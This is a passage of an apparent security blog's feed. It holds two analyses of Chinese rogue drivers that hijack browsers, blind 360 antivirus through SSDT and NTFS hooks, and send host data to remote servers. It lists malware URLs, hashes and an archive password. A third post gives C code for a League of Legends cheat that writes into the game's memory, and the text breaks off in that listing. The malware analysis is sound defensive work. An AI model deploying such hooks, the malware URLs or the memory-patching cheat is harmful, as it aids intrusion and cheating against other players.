    <title><![CDATA[病毒分析-haimianbaobao流氓驱动]]></title>
    <link href="http://blog.idhyt.com/2014/09/10/virus-malware-driver-hmbb/"/>
    <id>http://blog.idhyt.com/2014/09/10/virus-malware-driver-hmbb/</id>
    <published>2014-09-10T09:52:11.000Z</published>
    <updated>2015-12-31T11:57:52.000Z</updated>
    <content type="html"><![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查</p>
<h2 id="简介">简介</h2><p>MD5 : b9003854bee6ea8e5b1fc24ebc99bb4a<br>行为: haimianbaobao.exe流氓驱动，劫持浏览器，过滤杀软</p>
<p>1.该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。</p>
<p>2.通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软对其操作，保护自身。</p>
<h2 id="行为分析">行为分析</h2><p>1.驱动加载后，先检测下驱动注册表，然后获取ntdll.dll模块基址，获取其函数导出地址<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-1.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-2.png" alt=""></p>
<p>2.调用函数PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，监控创建进程，如果是浏览器进程，则判断其父进程如果是explorer.exe进程，则将haimianbaobao.dll注入到该进程中，对浏览器进行劫持;<br>如果为haimianbaobao.exe进程，则加载。haimianbaobao.dll位于C:\Documents and Settings\admin\Lhb\InstDrv\haimianbaobao.dll<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-3.png" alt=""></p>
<p>3.HOOK驱动\FileSystem\Ntfs的 IRP_MJ_DIRECTORY_CONTROL来过滤杀软文件操作来保护自身文件<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-4.png" alt=""></p>
<p>4.判断如果IRP请求是杀软进程操作，则过滤掉其IRP请求<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-5.png" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-6.png" alt=""></p>
<p>5.HOOK 驱动\FileSystem\Ntfs的 IRP_MJ_CREATE和IRP_MJ_READ来保护自身文件<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-7.png" alt=""></p>
<p>6.检测操自身文件的请求进程如果不是以下进程列表，则过滤掉其IRP请求<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-8.png" alt=""></p>
<p>7.创建进程用于过滤杀软请求，枚举系统模块信息，获取360驱动模块起始地址，获取的驱动模块分别为</p>
<pre><code>360Selfprotection.sys |<span class="string"> qutmdrv.sys </span>|<span class="string"> 360Avflt.sys </span>|<span class="string"> 360Box.sys </span>|<span class="string"> BAPIDRV.sys </span>
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-9.png" alt=""></p>
<p>8.根据系统版本，获取SSDT表索引，HOOK SSDT表<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-10.png" alt=""></p>
<p>9.如果调用ZwQuerySystemInformation函数，如果其调用模块是否位于360驱动模块中，或者位于杀软进程模块中，且该函数是否对haimianbaobao.exe进程进行操作，则将haimianbaobao.exe进程从进程结构序列中去除。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-11.png" alt=""></p>
<p>10.相同原理，过滤掉杀软对自身的ZwQueryInformationProcess，ZwReadFile，ZwTerminateProcess等操作。</p>
<h2 id="溯源查找">溯源查找</h2><h3 id="概述">概述</h3><p>Haimianbaobao通过推广软件捆绑安装，感染主机之后会释放驱动文件对浏览器进行劫持，同时通过HOOK SSDT过滤掉360杀软的操作请求，使360杀软进入离线模式保护自身。</p>
<h3 id="推广行为">推广行为</h3><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-12.png" alt=""></p>
<p>1.简易计算器scalculator.exe(md5: 8fc563782ad0d18e757fee6374b976d6)<br>该程序以uninstallself参数方式启动，隐藏窗口后台运行。之后添加开机自启动，从配置文件读取usrid和version下载推广软件到目录\scalculator\_temp.exe。同时，还会调用同目录下\supdate.exe进行更新并记录配置文件。</p>
<p>2.推广程序_temp.exe(md5:4B863BD16F6FFBDB940F783D47669886)<br>该程序启动后从远程服务器下载安装推广软件haimianbaobao程序。<br>下载链接:</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/k360.it537.com/maindata</span>3.php?install=<span class="number">00</span><span class="symbol">:</span><span class="number">0</span><span class="constant">C:</span><span class="number">29</span><span class="symbol">:D9</span><span class="symbol">:D9</span><span class="symbol">:AD&amp;qudaoid=&amp;ver=</span><span class="number">6.5</span>.<span class="number">1.9</span>&amp;name=haimianbaobao&amp;success=<span class="number">06</span>
</code></pre><p>更新链接:</p>
<pre><code><span class="string">http:</span><span class="comment">//updata.it537.com/cnzz/hmbb.html?qudaoid=&amp;ver=6.5.1.9&amp;name=haimianbaobao&amp;sucess=06</span>
</code></pre><p>日志文件 \haimianbaobao\bin\log_out.txt</p>
<pre><code><span class="symbol">http:</span>/<span class="regexp">/k360.it537.com/maindata</span>3.php?qw=bY4<span class="variable">%7BfFGuaE2vNFnxSyp</span><span class="variable">%7BNUrDPVoFQSqDQD</span><span class="variable">%5CweYQid1mmOT</span><span class="variable">%5C1</span><span class="variable">%5BZH</span><span class="variable">%3APh53KkGtPUYv</span><span class="variable">%5BV2nOXjgbY0q</span><span class="variable">%0F</span><span class="variable">%09ZY4j</span><span class="variable">%5BV</span><span class="variable">%3AkXX</span><span class="variable">%3Ald5Uk</span><span class="variable">%5B1W</span><span class="variable">%7Cb</span><span class="variable">%7B2vOi</span><span class="variable">%3C</span><span class="variable">%3E</span>
</code></pre><p>3.haimianbaobao推广程序<br>该程序会在感染系统加载驱动文件haimianbaobao.sys，该驱动程序注册一个进程创建回调函数，监视浏览器创建主进程，注入dll文件对浏览器操作进行劫持。同时通过HOOK驱动\FileSystem\Ntfs与SSDT表中大量的内核函数，从而过滤掉杀软的请求包，使杀软处于离线状态，保护自身。</p>
<p>4.后续分析<br>4.1 之前推断天之游侠游戏为推广母体不正确，该游戏启动时会遍历系统文件查找自身文件，因此对简易计算器文件有操作行为，查数据库时误以为是其释放，因此天之游侠游戏并非推广母体，暂时没有找到推广母体。<br>4.2 之后通过用户uuid查询用户最近几天的文件操作，发现存在天气日历，快看影视浏览器等推广软件，这几个软件是最近在黑top比较活跃的，因此暂时判断其为同一推广母体所推广安装，后续继续跟进。</p>
<p>5.查用户uuid = acc0be0a644b5b2fac08b1100ae3baf8最近的文件操作，里边有天气日历，快看影视，这些都是最近黑TOP比较活跃的推广软件，印象中首趣有推广这些软件，随进行分析。<br>官网下载链接：<a href="http://sq.cyousoft.com/" target="_blank" rel="external">http://sq.cyousoft.com/</a><br>MD5: 34E75CC128BB19B6D4E77315B8767123<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-13.png" alt=""></p>
<p>6.程序进程启动起来后，先向远程服务器发送Get请求，获取推广安装包数据，链接为：</p>
<pre><code>xml.tai69.com/config.php?v=<span class="number">1.0</span><span class="number">.3</span><span class="number">.9</span>
</code></pre><p>推广安装包数据加密存储，抓包如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-14.png" alt=""><br>将该数据下载到Temp目录下AAA.xml文件，该数据进行zip加密压缩， (压缩密码：123@*qSz) 解密过后得到推广软件列表。</p>
<pre><code>hao123|<span class="string">huaen123</span>|<span class="string">PPTV</span>|<span class="string">B5T_Setup.exe</span>|bdcalendar
</code></pre><p>推广列表中未找到简易计算器</p>
<p>7.百度搜haimianbaobao.dll 找到该篇帖子：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-15.png" alt=""><br>随后进入乐飞影视，随便找个视频播放，提示安装全能播放器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-16.png" alt=""></p>
<pre><code>最新版下载：首趣播放器 MD5: <span class="number">7</span>CC707937A415CF3EB88FBAF8242BA06 于<span class="number">0918</span>更新 MD5: <span class="number">6F</span>15675F2861B8AD9D2D499473062E08
备用版下载：鱼鱼影音浏览器 MD5: <span class="number">5</span>B41718D886BA3DD571CD55D4DCB16EE
</code></pre><p>8.首趣播放器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-17.png" alt=""><br>该程序运行先在Temp目录下释放setup文件，然后创建进程，启动参数为</p>
<pre><code><span class="string">"释放Setup文件"</span> /SL5=<span class="string">"<span class="variable">$B021C</span>,1045444,66048,首趣播放器"</span> 如下所示：
</code></pre><p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-18.png" alt=""><br>新进程启动起来后，先向远程服务器发送Get请求，获取推广安装包数据，链接为：</p>
<pre><code>xml.tai69.com/config.php?v=<span class="number">1.0</span><span class="number">.4</span><span class="number">.2</span>
</code></pre><p>推广安装包数据加密存储，抓包如下<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-19.png" alt=""><br>解密过后得到推广软件列表，未找到简易计算器。</p>
<pre><code>风行在线|<span class="string">壁纸在线</span>|<span class="string">设置导航为主页</span>|<span class="string">…</span>|<span class="string">天气日历 </span>|<span class="string"> 快看影视</span>|<span class="string">…</span>
</code></pre><p>在推广软件列表中未找到简易计算器。<br>同样0918更新推广的软件列表中也没有找到简易计算器。</p>
<p>9.鱼鱼影音浏览器 推广安装列表：download.yuyu.com/0822/setup.html<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-hmbb-20.png" alt=""><br>在推广列表中未找到简易计算器。</p>
<p>10.后续<br>卒…</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>haimianbaobao流氓驱动行为分析以及溯源追查</p>
<h2 id="简介">简介</h2><p>MD5 : b9003854bee6ea8e5b1fc24ebc99bb4a<br>行为: haimianbaobao.exe流氓驱动，劫持浏览器，过滤杀软</p>
]]>
    </summary>
    
      <category term="流氓" scheme="http://blog.idhyt.com/tags/%E6%B5%81%E6%B0%93/"/>
    
      <category term="驱动" scheme="http://blog.idhyt.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[病毒分析-驱动过滤]]></title>
    <link href="http://blog.idhyt.com/2014/09/02/virus-malware-driver-filter/"/>
    <id>http://blog.idhyt.com/2014/09/02/virus-malware-driver-filter/</id>
    <published>2014-09-02T08:54:11.000Z</published>
    <updated>2015-12-31T11:37:43.000Z</updated>
    <content type="html"><![CDATA[<p>一个流氓驱动行为简略分析</p>
<h2 id="简介">简介</h2><p>驱动模块主要两个功能：<br>1.通过PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，用于监控explorer.exe进程进行注入</p>
<p>2.添加TCP过滤，用于向远程服务器发送GET请求，请求数据为各个函数调用状态</p>
<p><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-1.jpg" alt=""></p>
<h2 id="行为">行为</h2><h3 id="TCP驱动过滤">TCP驱动过滤</h3><p>1.通过IoCreateDevice，IoAttachDeviceToDeviceStack等函数创建设备对象。程序每个函数调用结果会通过该设备对象发送远程服务器<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-2.jpg" alt=""></p>
<p>2.其中Host采用16进制写入变量中，循环向这四个服务器发送请求，服务器响应暂停<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-3.jpg" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-4.jpg" alt=""></p>
<pre><code>MsgLog为各函数调用状态
QuDao为驱动winntnetsys.sys注册表下DisplayName的键值中的标识符
<span class="keyword">MAC</span>为本机<span class="keyword">MAC</span>地址
SESID为当前系统时间
</code></pre><p>3.抓包如下所示：<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-5.jpg" alt=""></p>
<h3 id="进程注入">进程注入</h3><p>1.进程创建回调函数NotifyRoutine，先检测系统，如果不是XP和WIN7不进行注入，之后调用PsCreateSystemThread创建注入进程<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-6.jpg" alt=""></p>
<p>2.通过IoGetCurrentProcess获取进程EPROCESS结构，然后取偏移0x174(win7下为0x16C)获取ImageFileName，判断是否为exploere.exe进程，如果是的话调用PsGetProcessId返回进程ID<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-7.jpg" alt=""></p>
<p>3.获取\SystemRoot\system32\目录下的thunk.dll和winntnetsys.dll，计算出MD5值进行效验，效验成功开始注入。注入通过修改PEB结构+0x18处DefaultHeap到自定义的堆结构中，将其插入APC队列中加载到内存。<br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-8.jpg" alt=""><br><img src="http://7xi9s3.com1.z0.glb.clouddn.com/virus-malware-driver-9.jpg" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>一个流氓驱动行为简略分析</p>
<h2 id="简介">简介</h2><p>驱动模块主要两个功能：<br>1.通过PsSetLoadImageNotifyRoutine创建一个进程创建回调函数NotifyRoutine，用于监控explorer.exe进程进行注入</p>]]>
    </summary>
    
      <category term="过滤" scheme="http://blog.idhyt.com/tags/%E8%BF%87%E6%BB%A4/"/>
    
      <category term="驱动" scheme="http://blog.idhyt.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="virus" scheme="http://blog.idhyt.com/categories/virus/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[英雄联盟无限视距实现代码]]></title>
    <link href="http://blog.idhyt.com/2014/08/25/technic-lol-infinite-sight/"/>
    <id>http://blog.idhyt.com/2014/08/25/technic-lol-infinite-sight/</id>
    <published>2014-08-25T08:36:24.000Z</published>
    <updated>2016-01-03T10:08:25.000Z</updated>
    <content type="html"><![CDATA[<h2 id="原理">原理</h2><p>游戏进程<code>League of Legends.exe</code>中某个偏移记录着视距值，游戏根据这个数值设置你的当前游戏的屏幕分辨率，最大只能达到屏幕的极限分辨率那么大，所以一旦调的太大了外面只能看到黑色一片。</p>
<h2 id="实现方法">实现方法</h2><p>修改的方法也分两种，一种是将进程文件<code>League of Legends.exe</code>打开直接搜索其中默认的Float类型视距值2250，将其改为最大值4450，最大值其实没有上限，不过改的再大也是4450的效果。这种方法有个缺点，就是游戏一旦更新，这个进程文件改变，相应的偏移位置也会发生变化，所以还要重新去修改，比较麻烦。</p>
<p>这里说第二种方法，游戏运行起来后，动态从内存中搜索到视距值的位置，直接通过注入的方式，将视距值动态写进去，为减少对游戏的影响，只在进入游戏界面的时候进行修改操作，游戏结束后将原始视距值复原。并且为了兼容以后视距原始值以及修改最大值的变更，将这些参数全写入配置文件，想更改只需要修改配置文件里相应的值即可。</p>
<h2 id="实现代码">实现代码</h2><h3 id="主流程逻辑">主流程逻辑</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"stdafx.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"SightFunc.h"</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">WINBASEAPI HWND WINAPI <span class="title">GetConsoleWindow</span> <span class="params">()</span></span>;</span><br><span class="line"><span class="comment">/*</span><br><span class="line">#define oldSightValue 0x450CA000  //2250</span><br><span class="line">#define newSightValue 0x457A0000  //4000</span><br><span class="line">#define newSightValue 0x453B8000  //3000   </span><br><span class="line">#define newSightValue 0x458B1000  //4450   </span><br><span class="line">*/</span></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	WinInit();</span><br><span class="line">	<span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">	BOOL isNewSight = FALSE;</span><br><span class="line">	DWORD dwProcId = <span class="number">0</span>;</span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE *pTagModBaseAddr = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">// 如果已有互斥量存在则释放句柄并复位互斥量</span></span><br><span class="line">	HANDLE m_hMutex = CreateMutexW(<span class="literal">NULL</span>, FALSE, <span class="string">L"idhyt"</span>);</span><br><span class="line">	<span class="keyword">if</span> (ERROR_ALREADY_EXISTS == GetLastError())</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"The Program has been running! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//L"SeDebugPrivilege"</span></span><br><span class="line">	EnablePrivilege(SE_DEBUG_NAME, TRUE);</span><br><span class="line">	dwProcId = GetProcessIdByName(<span class="string">L"League of Legends.exe"</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="number">0</span> == dwProcId)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Get ProcessID error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"选择完英雄，进入读条状态时再启用!\n\n"</span>);</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcId);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Get ProcessHandle error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	pTagModBaseAddr = GetProcessModBaseAddr(<span class="string">L"League of Legends.exe"</span>, dwProcId);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pTagModBaseAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L"Get pTagModBaseAddr error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">		<span class="keyword">goto</span> gleave;</span><br><span class="line">	&#125;</span><br><span class="line">	PINI_ProfileInfor pIniProfileInfor = GetPrivateProfileInfor();</span><br><span class="line">	<span class="keyword">if</span> (pIniProfileInfor-&gt;bRet == TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			Sleep(<span class="number">1000</span>);</span><br><span class="line">			dwProcId = <span class="number">0</span>;</span><br><span class="line">			hProcess = <span class="literal">NULL</span>;</span><br><span class="line">			pTagModBaseAddr = <span class="literal">NULL</span>;</span><br><span class="line">			isNewSight = FALSE;</span><br><span class="line">			dwProcId = GetProcessIdByName(<span class="string">L"League of Legends.exe"</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="number">0</span> == dwProcId)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"等待进入游戏... ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">				&#125;</span><br><span class="line">				flag ++ ;</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcId);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> == hProcess)</span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Get ProcessHandle error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			pTagModBaseAddr = GetProcessModBaseAddr(<span class="string">L"League of Legends.exe"</span>, dwProcId);</span><br><span class="line">			<span class="keyword">if</span> (<span class="literal">NULL</span> == pTagModBaseAddr)</span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Get pTagModBaseAddr error! ErrorCode: %d\n"</span>, GetLastError());</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			isNewSight = SetNewSight(hProcess, pTagModBaseAddr, pIniProfileInfor-&gt;newSight, pIniProfileInfor-&gt;oldSight, pIniProfileInfor-&gt;dwRVA);</span><br><span class="line">			<span class="keyword">if</span> (isNewSight == TRUE)</span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Chage Sight Success!\n"</span>);</span><br><span class="line">				Sleep(<span class="number">3000</span>);</span><br><span class="line">				ShowWindow(GetConsoleWindow(), SW_HIDE);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				wprintf(<span class="string">L"Chage Sight False!\n"</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span> (GetProcessIdByName(<span class="string">L"League of Legends.exe"</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				Sleep(<span class="number">5000</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			Sleep(<span class="number">3000</span>);</span><br><span class="line">			ShowWindow(GetConsoleWindow(), SW_SHOW);</span><br><span class="line">			flag = <span class="number">0</span>;</span><br><span class="line">			system(<span class="string">"cls"</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"若继续使用无限视距功能,请勿关闭该窗口!\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">gleave:</span><br><span class="line">	<span class="keyword">if</span> (hProcess)</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">	<span class="keyword">if</span> (m_hMutex)</span><br><span class="line">		CloseHandle(m_hMutex);</span><br><span class="line">	EnablePrivilege(SE_DEBUG_NAME, FALSE);  </span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="用到的功能函数">用到的功能函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span 